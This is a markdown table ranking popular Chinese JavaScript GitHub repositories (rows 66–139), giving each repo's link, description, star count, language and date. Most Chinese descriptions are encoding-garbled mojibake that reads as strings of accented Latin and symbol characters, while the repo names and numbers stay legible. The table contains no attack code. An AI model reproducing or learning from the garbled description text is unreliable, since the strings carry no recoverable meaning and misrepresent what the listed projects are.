|66|[kdchang/reactjs101](https://github.com/kdchang/reactjs101)|ÂæûÈõ∂ÈñãÂßãÂ≠∏ ReactJSÔºàReactJS 101ÔºâÊòØ‰∏ÄÊú¨Â∏åÊúõËÆìÂàùÂ≠∏ËÄÖ‰∏ÄÁúãÂ∞±ÊáÇÁöÑ React ‰∏≠ÊñáÂÖ•ÈñÄÊïôÂ≠∏Êõ∏ÔºåÁî±Ê∑∫ÂÖ•Ê∑±Â≠∏Áøí ReactJS ÁîüÊÖãÁ≥ª (Flux, Redux, React Router, ImmutableJS, React Native, Relay/GraphQL etc.)„ÄÇ|3.8k|JavaScript|09/08|
|67|[margox/braft-editor](https://github.com/margox/braft-editor)|ÁæéËßÇÊòìÁî®ÁöÑReactÂØåÊñáÊú¨ÁºñËæëÂô®ÔºåÂü∫‰∫édraft-jsÂºÄÂèë|3.6k|JavaScript|10/06|
|68|[Tencent/westore](https://github.com/Tencent/westore)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èËß£ÂÜ≥ÊñπÊ°à - 1KB javascript Ë¶ÜÁõñÁä∂ÊÄÅÁÆ°ÁêÜ„ÄÅË∑®È°µÈÄöËÆØ„ÄÅÊèí‰ª∂ÂºÄÂèëÂíå‰∫ëÊï∞ÊçÆÂ∫ìÂºÄÂèë|3.6k|JavaScript|04/25|
|69|[Tencent/kbone](https://github.com/Tencent/kbone)|‰∏Ä‰∏™Ëá¥Âäõ‰∫éÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂíå Web Á´ØÂêåÊûÑÁöÑËß£ÂÜ≥ÊñπÊ°à|3.6k|JavaScript|10/22|
|70|[any86/any-rule](https://github.com/any86/any-rule)|ü¶ï  Â∏∏Áî®Ê≠£ÂàôÂ§ßÂÖ®, ÊîØÊåÅweb / vscode / idea / Alfred WorkflowÂ§öÂπ≥Âè∞|3.5k|JavaScript|10/20|
|71|[gxtrobot/bustag](https://github.com/gxtrobot/bustag)|a tag and recommend system for old bus driver ÁªôËÄÅÂè∏Êú∫Áî®ÁöÑ‰∏Ä‰∏™Áï™Âè∑Êé®ËçêÁ≥ªÁªü|3.5k|JavaScript|03/31|
|72|[huangjianke/Gitter](https://github.com/huangjianke/Gitter)|Gitter for GitHub - ÂèØËÉΩÊòØÁõÆÂâçÈ¢úÂÄºÊúÄÈ´òÁöÑGitHubÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂÆ¢Êà∑Á´Ø|3.4k|JavaScript|10/21|
|73|[remaxjs/remax](https://github.com/remaxjs/remax)|‰ΩøÁî®ÁúüÊ≠£ÁöÑ React ÊûÑÂª∫Ë∑®Âπ≥Âè∞Â∞èÁ®ãÂ∫è|3.3k|JavaScript|10/28|
|74|[alibaba/f2etest](https://github.com/alibaba/f2etest)|F2etestÊòØ‰∏Ä‰∏™Èù¢ÂêëÂâçÁ´Ø„ÄÅÊµãËØï„ÄÅ‰∫ßÂìÅÁ≠âÂ≤ó‰ΩçÁöÑÂ§öÊµèËßàÂô®ÂÖºÂÆπÊÄßÊµãËØïÊï¥‰ΩìËß£ÂÜ≥ÊñπÊ°à„ÄÇ|3.2k|JavaScript|10/13|
|75|[zxlie/FeHelper](https://github.com/zxlie/FeHelper)|üòçFeHelper--WebÂâçÁ´ØÂä©ÊâãÔºàAwesomeÔºÅChrome & Firefox & MS-Edge Extension, All in one Toolbox!Ôºâ|3.2k|JavaScript|10/29|
|76|[bilibili-helper/bilibili-helper-o](https://github.com/bilibili-helper/bilibili-helper-o)|ÂìîÂì©ÂìîÂì© (bilibili.com) ËæÖÂä©Â∑•ÂÖ∑ÔºåÂèØ‰ª•ÊõøÊç¢Êí≠ÊîæÂô®„ÄÅÊé®ÈÄÅÈÄöÁü•Âπ∂ËøõË°å‰∏Ä‰∫õÂø´Êç∑Êìç‰Ωú|3.2k|JavaScript|10/30|
|77|[berwin/Blog](https://github.com/berwin/Blog)|ËÆ∞ÂΩïÊàêÈïøÁöÑËøáÁ®ã|3.1k|JavaScript|06/10|
|78|[aui/artDialog](https://github.com/aui/artDialog)|ÁªèÂÖ∏ÁöÑÁΩëÈ°µÂØπËØùÊ°ÜÁªÑ‰ª∂|3.1k|JavaScript|08/05|
|79|[dyq086/wepy-mall](https://github.com/dyq086/wepy-mall)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫è--Âü∫‰∫éwepy ÂïÜÂüé(ÂæÆÂ∫ó)ÂæÆ‰ø°Â∞èÁ®ãÂ∫è Ê¨¢ËøéÂ≠¶‰π†‰∫§ÊµÅ|3.1k|JavaScript|05/13|
|80|[wandergis/coordtransform](https://github.com/wandergis/coordtransform)|Êèê‰æõ‰∫ÜÁôæÂ∫¶ÂùêÊ†áÔºàBD09Ôºâ„ÄÅÂõΩÊµãÂ±ÄÂùêÊ†áÔºàÁÅ´ÊòüÂùêÊ†áÔºåGCJ02Ôºâ„ÄÅÂíåWGS84ÂùêÊ†áÁ≥ª‰πãÈó¥ÁöÑËΩ¨Êç¢|3.0k|JavaScript|06/06|
|81|[ly525/luban-h5](https://github.com/ly525/luban-h5)|[WIP]en: web design tool    mobile page builder/editor    mini webflow for mobile page. zh: Á±ª‰ººÊòì‰ºÅÁßÄÁöÑH5Âà∂‰Ωú„ÄÅÂª∫Á´ôÂ∑•ÂÖ∑„ÄÅÂèØËßÜÂåñÊê≠Âª∫Á≥ªÁªü.|3.0k|JavaScript|10/30|
|82|[think2011/localResizeIMG](https://github.com/think2011/localResizeIMG)|üî• ÂâçÁ´ØÊú¨Âú∞ÂÆ¢Êà∑Á´ØÂéãÁº©ÂõæÁâáÔºåÂÖºÂÆπIOSÔºåAndroidÔºåPC„ÄÅËá™Âä®ÊåâÈúÄÂä†ËΩΩÊñá‰ª∂ |3.0k|JavaScript|10/15|
|83|[langren1353/GM_script](https://github.com/langren1353/GM_script)|ÊàëÂ∞±ÊòØÊù•ÂàÜ‰∫´ËÑöÊú¨Áé©Áé©ÁöÑ|2.9k|JavaScript|10/21|
|84|[hustcc/echarts-for-react](https://github.com/hustcc/echarts-for-react)|:chart_with_upwards_trend: Apache ECharts (incubating) components for React wrapper. ‰∏Ä‰∏™ÁÆÄÂçïÁöÑ Apache echarts (incubating) ÁöÑ React Â∞ÅË£Ö„ÄÇ|2.8k|JavaScript|09/06|
|85|[doramart/DoraCMS](https://github.com/doramart/DoraCMS)|DoraCMSÊòØÂü∫‰∫éNodejs+eggjs+mongodbÁºñÂÜôÁöÑ‰∏ÄÂ•óÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÔºåÁªìÊûÑÁÆÄÂçïÔºåËæÉÁõÆÂâç‰∏Ä‰∫õÂºÄÊ∫êÁöÑcmsÔºådoracmsÊòì‰∫éÊãìÂ±ïÔºåÁâπÂà´ÈÄÇÂêàÂâçÁ´ØÂºÄÂèëÂ∑•Á®ãÂ∏àÂÅö‰∫åÊ¨°ÂºÄÂèë„ÄÇ|2.8k|JavaScript|10/24|
|86|[crmeb/CRMEB](https://github.com/crmeb/CRMEB)|ÂºÄÊ∫êÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÂïÜÂüé Â∞èÁ®ãÂ∫èÂïÜÂüéÁ≥ªÁªüÔºåÂ∏¶ÂàÜÈîÄ„ÄÅÊãºÂõ¢„ÄÅÁßíÊùÄ„ÄÅÁ†ç‰ª∑„ÄÅ‰ºòÊÉ†Âà∏„ÄÅÁßØÂàÜÁ≠âÂäüËÉΩÔºåÂâçÂêéÁ´ØÂÖ®ÈÉ®ÂºÄÊ∫êÔºåÊõ¥ÊòØ‰∏ÄÂ•óÊñπ‰æø‰∫åÊ¨°ÂºÄÂèëÁöÑÊ°ÜÊû∂|2.8k|JavaScript|10/29|
|87|[cteamx/Thief](https://github.com/cteamx/Thief)|‰∏ÄÊ¨æÂàõÊñ∞Ë∑®Âπ≥Âè∞Êë∏È±ºÁ•ûÂô®ÔºåÊîØÊåÅÂ∞èËØ¥„ÄÅËÇ°Á•®„ÄÅÁΩëÈ°µ„ÄÅËßÜÈ¢ë„ÄÅÁõ¥Êí≠„ÄÅPDF„ÄÅÊ∏∏ÊàèÁ≠âÊë∏È±ºÊ®°ÂºèÔºå‰∏∫‰∏äÁè≠ÊóèÊâìÈÄ†ÁöÑ‰∏äÁè≠ÂøÖÂ§áÁ•ûÂô®Ôºå‰ΩøÁî®Ê≠§ËΩØ‰ª∂ÂèØ‰ª•ËÆ©‰∏äÁè≠ÂÄçÊÑüËΩªÊùæÔºåËøúÁ¶ª ICU„ÄÇ|2.8k|JavaScript|05/05|
|88|[iammapping/wedding](https://github.com/iammapping/wedding)|Â©öÁ§ºÂ§ßÂ±è‰∫íÂä®ÔºåÂæÆ‰ø°ËØ∑Êü¨‰∏ÄÁ´ôÂºèËß£ÂÜ≥ÊñπÊ°à|2.8k|JavaScript|07/16|
|89|[Ice-Hazymoon/MikuTools](https://github.com/Ice-Hazymoon/MikuTools)|‰∏Ä‰∏™ËΩªÈáèÁöÑÂ∑•ÂÖ∑ÈõÜÂêà|2.8k|JavaScript|07/20|
|90|[AlloyTeam/PhyTouch](https://github.com/AlloyTeam/PhyTouch)|Smooth scrolling, rotation, pull to refresh, page transition and any motion for the web - ‰∏ùËà¨È°∫ÊªëÁöÑËß¶Êë∏ËøêÂä®ÊñπÊ°à|2.8k|JavaScript|06/22|
|91|[sx1989827/DOClever](https://github.com/sx1989827/DOClever)|ÂÅöÊúÄÂ•ΩÁöÑÊé•Âè£ÁÆ°ÁêÜÂπ≥Âè∞|2.7k|JavaScript|09/04|
|92|[sunoj/jjb](https://github.com/sunoj/jjb)|‰∫¨‰ª∑‰øùÔºà‰∫¨‰ª∑ÂÆùÔºâ‚Äî‚Äî ‰∏Ä‰∏™Â∏ÆÂä©‰Ω†Ëá™Âä®Áî≥ËØ∑‰∫¨‰∏ú‰ª∑Ê†º‰øùÊä§ÁöÑchromeÊãìÂ±ï|2.7k|JavaScript|10/28|
|93|[x-extends/vxe-table](https://github.com/x-extends/vxe-table)|üê¨ vxe-table vue  Ë°®Ê†ºËß£ÂÜ≥ÊñπÊ°à|2.6k|JavaScript|10/27|
|94|[shen100/mili](https://github.com/shen100/mili)|mili ÊòØ‰∏Ä‰∏™ÂºÄÊ∫êÁöÑÁ§æÂå∫Á≥ªÁªüÔºåÁïåÈù¢‰ºòÈõÖÔºåÂäüËÉΩ‰∏∞ÂØåüòõ|2.6k|JavaScript|09/05|
|95|[qq281113270/vue](https://github.com/qq281113270/vue)|vueÊ∫êÁ†ÅÈÄêË°åÊ≥®ÈáäÂàÜÊûê+40Â§ömÁöÑvueÊ∫êÁ†ÅÁ®ãÂ∫èÊµÅÁ®ãÂõæÊÄùÁª¥ÂØºÂõæ ÔºàdiffÈÉ®ÂàÜÂæÖÂêéÁª≠Êõ¥Êñ∞Ôºâ|2.6k|JavaScript|07/15|
|96|[superman66/vue-axios-github](https://github.com/superman66/vue-axios-github)|Vue ÂÖ®ÂÆ∂Ê°∂ + axios ÂâçÁ´ØÂÆûÁé∞ÁôªÂΩïÊã¶Êà™„ÄÅÁôªÂá∫„ÄÅÊã¶Êà™Âô®Á≠âÂäüËÉΩ|2.6k|JavaScript|06/09|
|97|[mdnice/markdown-nice](https://github.com/mdnice/markdown-nice)|ÊîØÊåÅ‰∏ªÈ¢òËÆæËÆ°ÁöÑ Markdown ÁºñËæëÂô®ÔºåËÆ©ÊéíÁâàÂèò Nice|2.5k|JavaScript|10/11|
|98|[panteng/wechat-h5-boilerplate](https://github.com/panteng/wechat-h5-boilerplate)|‰∏∫ËÖæËÆØÂæÆ‰ø°‰ºòÂåñÁöÑH5Âä®ÊïàÊ®°ÊùøÔºåÂ∏ÆÂä©‰Ω†Âø´ÈÄüÊûÑÂª∫ÂÖ®Â±èÊªöÂä®ÂûãH5È°µÈù¢„ÄÇ|2.5k|JavaScript|07/06|
|99|[TalkingData/inmap](https://github.com/TalkingData/inmap)|Â§ßÊï∞ÊçÆÂú∞ÁêÜÂèØËßÜÂåñ |2.5k|JavaScript|08/07|
|100|[feelschaotic/AndroidKnowledgeSystem](https://github.com/feelschaotic/AndroidKnowledgeSystem)|The most complete Android advanced route knowledge map ‚≠êÔ∏è‰Ω†ÊÉ≥Ë¶ÅÁöÑÊúÄÂÖ® Android ËøõÈò∂Ë∑ØÁ∫øÁü•ËØÜÂõæË∞±+Âπ≤Ë¥ßËµÑÊñôÊî∂ÈõÜüöÄ |2.5k|JavaScript|10/08|
|101|[didi/mpx](https://github.com/didi/mpx)|MpxÔºå‰∏ÄÊ¨æÂÖ∑Êúâ‰ºòÁßÄÂºÄÂèë‰ΩìÈ™åÂíåÊ∑±Â∫¶ÊÄßËÉΩ‰ºòÂåñÁöÑÂ¢ûÂº∫ÂûãÂ∞èÁ®ãÂ∫èÂºÄÂèëÊ°ÜÊû∂|2.5k|JavaScript|10/29|
|102|[JAVClub/core](https://github.com/JAVClub/core)|üîû JAVClub - ËÆ©‰Ω†ÁöÑÂ§ßÂßêÂßê‰∏çÂÜçËµ∞‰∏¢|2.4k|JavaScript|09/13|
|103|[Kujiale-Mobile/Painter](https://github.com/Kujiale-Mobile/Painter)|Â∞èÁ®ãÂ∫èÁîüÊàêÂõæÁâáÂ∫ìÔºåËΩªÊùæÈÄöËøá json ÊñπÂºèÁªòÂà∂‰∏ÄÂº†ÂèØ‰ª•ÂèëÂà∞ÊúãÂèãÂúàÁöÑÂõæÁâá|2.4k|JavaScript|10/20|
|104|[renrenio/renren-fast-vue](https://github.com/renrenio/renren-fast-vue)|renren-fast-vueÂü∫‰∫évue„ÄÅelement-uiÊûÑÂª∫ÂºÄÂèëÔºåÂÆûÁé∞renren-fastÂêéÂè∞ÁÆ°ÁêÜÂâçÁ´ØÂäüËÉΩÔºåÊèê‰æõ‰∏ÄÂ•óÊõ¥‰ºòÁöÑÂâçÁ´ØËß£ÂÜ≥ÊñπÊ°à„ÄÇ|2.4k|JavaScript|10/10|
|105|[mxflutter/mxflutter](https://github.com/mxflutter/mxflutter)|Âü∫‰∫éJavaScript ÁöÑFlutterÊ°ÜÊû∂ mxflutter|2.4k|JavaScript|07/10|
|106|[wetools/wept](https://github.com/wetools/wept)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫è web Á´ØÂÆûÊó∂ËøêË°åÂ∑•ÂÖ∑|2.3k|JavaScript|08/30|
|107|[meng-chuan/Unlock-netease-cloud-music](https://github.com/meng-chuan/Unlock-netease-cloud-music)|Ëß£ÈîÅÁΩëÊòì‰∫ëÈü≥‰πêÂÆ¢Êà∑Á´ØÂèòÁÅ∞Ê≠åÊõ≤|2.3k|JavaScript|10/14|
|108|[xaboy/form-create](https://github.com/xaboy/form-create)|:fire::fire::fire: Âº∫Â§ßÁöÑË°®ÂçïÁîüÊàêÂô® Form builder with dynamic rendering, data collection, validation and submission capabilities, built-in 17 common form components, support for two-way data binding, event extension, and support for building built-in components and any vue components using json.|2.3k|JavaScript|09/25|
|109|[TaleLin/lin-ui](https://github.com/TaleLin/lin-ui)|üåà ÁÆÄÊ¥Å„ÄÅÊòìÁî®„ÄÅÁÅµÊ¥ªÁöÑÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁªÑ‰ª∂Â∫ì|2.3k|JavaScript|10/23|
|110|[mumuy/data_location](https://github.com/mumuy/data_location)|‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩË°åÊîøÂå∫ÂàíÊï∞ÊçÆ„ÄêÁúÅ„ÄÅÂ∏Ç„ÄÅÂå∫Âéø„ÄÅ‰π°ÈïáË°óÈÅì„Äë‰∏≠ÂõΩÁúÅÂ∏ÇÂå∫Èïá‰∏âÁ∫ßÂõõÁ∫ßËÅîÂä®Âú∞ÂùÄÊï∞ÊçÆÔºàGB/T 2260Ôºâ|2.3k|JavaScript|07/08|
|111|[hyue418/taobao-11-11](https://github.com/hyue418/taobao-11-11)|üöÄ2020Ê∑òÂÆù+‰∫¨‰∏ú+ÊîØ‰ªòÂÆùÂèåÂçÅ‰∏Ä Âèå11ÂÖ®Ê∞ëÂÖªÁå´ ÂÖ®Ê∞ëËê•‰∏öËá™Âä®ÂåñËÑöÊú¨„ÄêÂÖ®È¢ùÂ•ñÂä±ÔºåÈò≤Ê£ÄÊµã„Äë|2.2k|JavaScript|10/30|
|112|[jasondu/wxa-plugin-canvas](https://github.com/jasondu/wxa-plugin-canvas)|Â∞èÁ®ãÂ∫èÊµ∑Êä•ÁªÑ‰ª∂-ÁîüÊàêÊúãÂèãÂúàÂàÜ‰∫´Êµ∑Êä•Âπ∂ÁîüÊàêÂõæÁâá|2.2k|JavaScript|10/09|
|113|[yyhsong/iDataV](https://github.com/yyhsong/iDataV)|Â§ßÂ±èÊï∞ÊçÆÂèØËßÜÂåñ Big screen data visualization demo|2.2k|JavaScript|06/03|
|114|[nashaofu/dingtalk](https://github.com/nashaofu/dingtalk)|ÈíâÈíâÊ°åÈù¢ÁâàÔºåÂü∫‰∫éelectronÂíåÈíâÈíâÁΩëÈ°µÁâàÂºÄÂèëÔºåÊîØÊåÅWindows„ÄÅLinuxÂíåmacOS|2.2k|JavaScript|10/07|
|115|[xiangyuecn/AreaCity-JsSpider-StatsGov](https://github.com/xiangyuecn/AreaCity-JsSpider-StatsGov)|ÁúÅÂ∏ÇÂå∫Âéø‰π°Èïá‰∏âÁ∫ßÊàñÂõõÁ∫ßÂüéÂ∏ÇÊï∞ÊçÆÔºåÂ∏¶ÊãºÈü≥Ê†áÊ≥®„ÄÅÂùêÊ†á„ÄÅË°åÊîøÂå∫ÂüüËæπÁïåËåÉÂõ¥Ôºõ2020Âπ¥10Êúà24Êó•ÊúÄÊñ∞ÈááÈõÜÔºåÊèê‰æõcsvÊ†ºÂºèÊñá‰ª∂ÔºåÊîØÊåÅÂú®Á∫øËΩ¨ÊàêÂ§öÁ∫ßËÅîÂä®js‰ª£Á†Å„ÄÅÈÄöÁî®jsonÊ†ºÂºèÔºåÊèê‰æõËΩØ‰ª∂ËΩ¨Êàêshp„ÄÅgeojson„ÄÅsql„ÄÅÂØºÂÖ•Êï∞ÊçÆÂ∫ìÔºõÂ∏¶ÊµèËßàÂô®ÈáåÈù¢ËøêË°åÁöÑjsÈááÈõÜÊ∫êÁ†ÅÔºåÁªºÂêà‰∫Ü‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩÊ∞ëÊîøÈÉ®„ÄÅÂõΩÂÆ∂ÁªüËÆ°Â±Ä„ÄÅÈ´òÂæ∑Âú∞Âõæ„ÄÅËÖæËÆØÂú∞ÂõæË°åÊîøÂå∫ÂàíÊï∞ÊçÆ|2.2k|JavaScript|10/24|
|116|[qit-team/taro-yanxuan](https://github.com/qit-team/taro-yanxuan)|È¶ñ‰∏™ Taro Â§öÁ´ØÁªü‰∏ÄÂÆû‰æã - ÁΩëÊòì‰∏•ÈÄâÔºàÂ∞èÁ®ãÂ∫è + H5 + React NativeÔºâ - By Ë∂£Â∫ó FED|2.2k|JavaScript|09/07|
|117|[imfly/bitcoin-on-nodejs](https://github.com/imfly/bitcoin-on-nodejs)|„ÄäNode.jsÂå∫ÂùóÈìæÂºÄÂèë„ÄãÔºåÊ≥®ÔºöÊñ∞Áâà‰ª£Á†ÅÂ∑≤ÂºÄÊ∫êÔºÅËØ∑starÊîØÊåÅÂì¶-^-Ôºö|2.2k|JavaScript|02/02|
|118|[zhongshaofa/layuimini](https://github.com/zhongshaofa/layuimini)|ÂêéÂè∞adminÂâçÁ´ØÊ®°ÊùøÔºåÂü∫‰∫é layui ÁºñÂÜôÁöÑÊúÄÁÆÄÊ¥Å„ÄÅÊòìÁî®ÁöÑÂêéÂè∞Ê°ÜÊû∂Ê®°Êùø„ÄÇÂè™ÈúÄÊèê‰æõ‰∏Ä‰∏™Êé•Âè£Â∞±Áõ¥Êé•ÂàùÂßãÂåñÊï¥‰∏™Ê°ÜÊû∂ÔºåÊó†ÈúÄÂ§çÊùÇÊìç‰Ωú„ÄÇ|2.2k|JavaScript|10/13|
|119|[o2oa/o2oa](https://github.com/o2oa/o2oa)|ÂºÄÊ∫êOAÁ≥ªÁªü - Á†Å‰∫ëGVP JavaÂºÄÊ∫êoa ‰ºÅ‰∏öOAÂäûÂÖ¨Âπ≥Âè∞ ‰ºÅ‰∏öOA ÂçèÂêåÂäûÂÖ¨OA ÊµÅÁ®ãÂπ≥Âè∞OA O2OA OAÔºåÊîØÊåÅÂõΩ‰∫ßÈ∫íÈ∫üÊìç‰ΩúÁ≥ªÁªüÂíåÂõΩ‰∫ßÊï∞ÊçÆÂ∫ìÔºàËææÊ¢¶„ÄÅ‰∫∫Â§ßÈáë‰ªìÔºâÔºåÊîøÂä°OAÔºåÂÜõÂ∑•‰ø°ÊÅØÂåñOA|2.2k|JavaScript|10/30|
|120|[huiyan-fe/mapv](https://github.com/huiyan-fe/mapv)|a library of geography visualization-Âú∞ÁêÜ‰ø°ÊÅØÂèØËßÜÂåñÂ∫ì|2.2k|JavaScript|09/29|
|121|[wecatch/china_regions](https://github.com/wecatch/china_regions)|ÊúÄÂÖ®ÊúÄÊñ∞‰∏≠ÂõΩÁúÅÔºåÂ∏ÇÔºåÂú∞Âå∫jsonÂèäsqlÊï∞ÊçÆ|2.1k|JavaScript|07/22|
|122|[xiangyuecn/Recorder](https://github.com/xiangyuecn/Recorder)|html5 js ÂΩïÈü≥ mp3 wav ogg webm amr Ê†ºÂºèÔºåÊîØÊåÅpcÂíåAndroid„ÄÅiosÈÉ®ÂàÜÊµèËßàÂô®„ÄÅÂíåHybrid AppÔºàÊèê‰æõAndroid IOS AppÊ∫êÁ†ÅÔºâÔºåÂæÆ‰ø°‰πüÊòØÊîØÊåÅÁöÑÔºåÊèê‰æõH5ÁâàËØ≠Èü≥ÈÄöËØùËÅäÂ§©Á§∫‰æã ÂíåDTMFÁºñËß£Á†Å|2.1k|JavaScript|10/21|
|123|[yanyiwu/nodejieba](https://github.com/yanyiwu/nodejieba)|""ÁªìÂ∑¥""‰∏≠ÊñáÂàÜËØçÁöÑNode.jsÁâàÊú¨|2.0k|JavaScript|09/15|
|124|[chokcoco/jQuery-](https://github.com/chokcoco/jQuery-)|jQueryÊ∫êÁ†ÅËß£Êûê|2.0k|JavaScript|10/21|
|125|[OBKoro1/koro1FileHeader](https://github.com/OBKoro1/koro1FileHeader)|Âú®vscode‰∏≠Áî®‰∫éÁîüÊàêÊñá‰ª∂Â§¥ÈÉ®Ê≥®ÈáäÂíåÂáΩÊï∞Ê≥®ÈáäÁöÑÊèí‰ª∂ÔºåÁªèËøáÂ§öÁâàËø≠‰ª£ÂêéÔºåÊèí‰ª∂ÔºöÊîØÊåÅÊâÄÊúâ‰∏ªÊµÅËØ≠Ë®Ä,ÂäüËÉΩÂº∫Â§ßÔºåÁÅµÊ¥ªÊñπ‰æøÔºåÊñáÊ°£ÈΩêÂÖ®ÔºåÈ£üÁî®ÁÆÄÂçïÔºÅËßâÂæóÊèí‰ª∂‰∏çÈîôÁöÑËØùÔºåÁÇπÂáªÂè≥‰∏äËßíÁªô‰∏™Star‚≠êÔ∏èÂëÄ~|2.0k|JavaScript|10/27|
|126|[CarGuo/GSYGithubAPP](https://github.com/CarGuo/GSYGithubAPP)|Ë∂ÖÂÆåÊï¥ÁöÑReact NativeÈ°πÁõÆÔºåÂäüËÉΩ‰∏∞ÂØåÔºåÈÄÇÂêàÂ≠¶‰π†ÂíåÊó•Â∏∏‰ΩøÁî®„ÄÇGSYGithubAppÁ≥ªÂàóÁöÑ‰ºòÂäøÔºöÊàë‰ª¨ÁõÆÂâçÂ∑≤ÁªèÊã•ÊúâFlutter„ÄÅWeex„ÄÅReactNative„ÄÅkotlin Âõõ‰∏™ÁâàÊú¨„ÄÇ ÂäüËÉΩÈΩêÂÖ®ÔºåÈ°πÁõÆÊ°ÜÊû∂ÂÜÖÊäÄÊúØÊ∂âÂèäÈù¢ÂπøÔºåÂÆåÊàêÂ∫¶È´òÔºåÈÖçÂ•óÊñáÁ´†ÔºåÈÄÇÂêàÂÖ®Èù¢Â≠¶‰π†ÔºåÂØπÊØîÂèÇËÄÉ„ÄÇÂºÄÊ∫êGithubÂÆ¢Êà∑Á´ØAppÔºåÊõ¥Â•ΩÁöÑ‰ΩìÈ™åÔºåÊõ¥‰∏∞ÂØåÁöÑÂäüËÉΩÔºåÊó®Âú®Êõ¥Â•ΩÁöÑÊó•Â∏∏ÁÆ°ÁêÜÂíåÁª¥Êä§‰∏™‰∫∫GithubÔºåÊèê‰æõÊõ¥Â•ΩÊõ¥Êñπ‰æøÁöÑÈ©æËΩ¶‰ΩìÈ™åŒ£(Ôø£„ÄÇÔø£Ôæâ)Ôæâ„ÄÇÂêåÊ¨æWeexÁâàÊú¨ Ôºö https://github.com/CarGuo/GSYGithubAppWeex „ÄÅÂêåÊ¨æFlutterÁâàÊú¨ Ôºö https://github.com/CarGu ...|2.0k|JavaScript|09/06|
|127|[lavas-project/lavas](https://github.com/lavas-project/lavas)|Âü∫‰∫é Vue ÁöÑ PWA Ëß£ÂÜ≥ÊñπÊ°àÔºåÂ∏ÆÂä©ÂºÄÂèëËÄÖÂø´ÈÄüÊê≠Âª∫ PWA Â∫îÁî®ÔºåËß£ÂÜ≥Êé•ÂÖ• PWA ÁöÑÂêÑÁßçÈóÆÈ¢ò|2.0k|JavaScript|08/12|
|128|[staven630/vue-cli4-config](https://github.com/staven630/vue-cli4-config)|vue-cli4ÈÖçÁΩÆvue.config.jsÊåÅÁª≠Êõ¥Êñ∞|1.9k|JavaScript|09/10|
|129|[guanpengchn/awesome-books](https://github.com/guanpengchn/awesome-books)|:books: ÂºÄÂèëËÄÖÊé®ËçêÈòÖËØªÁöÑ‰π¶Á±ç|1.9k|JavaScript|03/30|
|130|[thinkcmf/thinkcmf](https://github.com/thinkcmf/thinkcmf)|ThinkCMFÊòØ‰∏ÄÊ¨æÊîØÊåÅSwooleÁöÑÂºÄÊ∫êÂÜÖÂÆπÁÆ°ÁêÜÊ°ÜÊû∂ÔºåÂü∫‰∫éThinkPHP5.1ÂºÄÂèëÔºåÂêåÊó∂ÊîØÊåÅPHP-FPMÂíåSwooleÂèåÊ®°ÂºèÔºåËÆ©WEBÂºÄÂèëÊõ¥Âø´!|1.9k|JavaScript|10/27|
|131|[jimuyouyou/node-interview-questions](https://github.com/jimuyouyou/node-interview-questions)|Node.jsÈù¢ËØïÈ¢òÔºå‰æßÈáçÂêéÁ´ØÂ∫îÁî®‰∏éÂØπNodeÊ†∏ÂøÉÁöÑÁêÜËß£|1.9k|JavaScript|06/04|
|132|[aliyun/oss-browser](https://github.com/aliyun/oss-browser)|OSS Browser Êèê‰æõÁ±ª‰ººwindowsËµÑÊ∫êÁÆ°ÁêÜÂô®ÂäüËÉΩ„ÄÇÁî®Êà∑ÂèØ‰ª•ÂæàÊñπ‰æøÁöÑÊµèËßàÊñá‰ª∂Ôºå‰∏ä‰º†‰∏ãËΩΩÊñá‰ª∂ÔºåÊîØÊåÅÊñ≠ÁÇπÁª≠‰º†Á≠â„ÄÇ|1.9k|JavaScript|10/27|
|133|[YvetteLau/Blog](https://github.com/YvetteLau/Blog)|„ÄêÂâçÁ´ØËøõÈò∂„Äë‰ºòË¥®ÂçöÊñá|1.9k|JavaScript|09/10|
|134|[hyj1991/easy-monitor](https://github.com/hyj1991/easy-monitor)|‰ºÅ‰∏öÁ∫ß Node.js Â∫îÁî®ÊÄßËÉΩÁõëÊéß‰∏éÁ∫ø‰∏äÊïÖÈöúÂÆö‰ΩçËß£ÂÜ≥ÊñπÊ°à|1.9k|JavaScript|08/28|
|135|[iamxjb/winxin-app-watch-life.net](https://github.com/iamxjb/winxin-app-watch-life.net)|ÂæÆÊÖïÂ∞èÁ®ãÂ∫èÂºÄÊ∫êÁâà-WordPressÁâàÂæÆ‰ø°Â∞èÁ®ãÂ∫è|1.9k|JavaScript|09/27|
|136|[notadd/neditor](https://github.com/notadd/neditor)|Âü∫‰∫é ueditorÁöÑÊõ¥Áé∞‰ª£ÂåñÁöÑÂØåÊñáÊú¨ÁºñËæëÂô®ÔºåÊîØÊåÅHTTPS|1.8k|JavaScript|04/30|
|137|[justjavac/ReplaceGoogleCDN](https://github.com/justjavac/ReplaceGoogleCDN)|:cancer: ‰∏Ä‰∏™ Chrome Êèí‰ª∂ÔºöÂ∞Ü Google CDN ÊõøÊç¢‰∏∫ÂõΩÂÜÖÁöÑ„ÄÇ|1.8k|JavaScript|07/15|
|138|[BetaSu/just-react](https://github.com/BetaSu/just-react)|„ÄåReactÊäÄÊúØÊè≠Áßò„Äç  ‰∏ÄÊú¨Ëá™È°∂Âêë‰∏ãÔºå‰ªéÁêÜÂøµÂà∞‰ª£Á†ÅÁöÑÊ∫êÁ†ÅÂàÜÊûê‰π¶|1.8k|JavaScript|10/28|
|139|[renrenio/renren-security](https://github.com/renrenio/renren-security)|ÈááÁî®Spring„ÄÅMyBatis„ÄÅShiroÊ°ÜÊû∂ÔºåÂºÄÂèëÁöÑ‰∏ÄÂ•óÊùÉÈôêÁ≥ªÁªüÔºåÊûÅ‰ΩéÈó®ÊßõÔºåÊãøÊù•Âç≥Áî®„ÄÇËÆæËÆ°‰πãÂàùÔºåÂ∞±ÈùûÂ∏∏Ê≥®ÈáçÂÆâÂÖ®ÊÄßÔºå‰∏∫‰ºÅ‰∏öÁ≥ªÁªü‰øùÈ©æÊä§Ëà™ÔºåËÆ©‰∏ÄÂàáÈÉΩÂèòÂæóÂ¶ÇÊ≠§ÁÆÄÂçï„ÄÇ„ÄêQQÁæ§Ôºö324780204„ÄÅ145799952„Äë|1.8k|JavaScript|10/13|
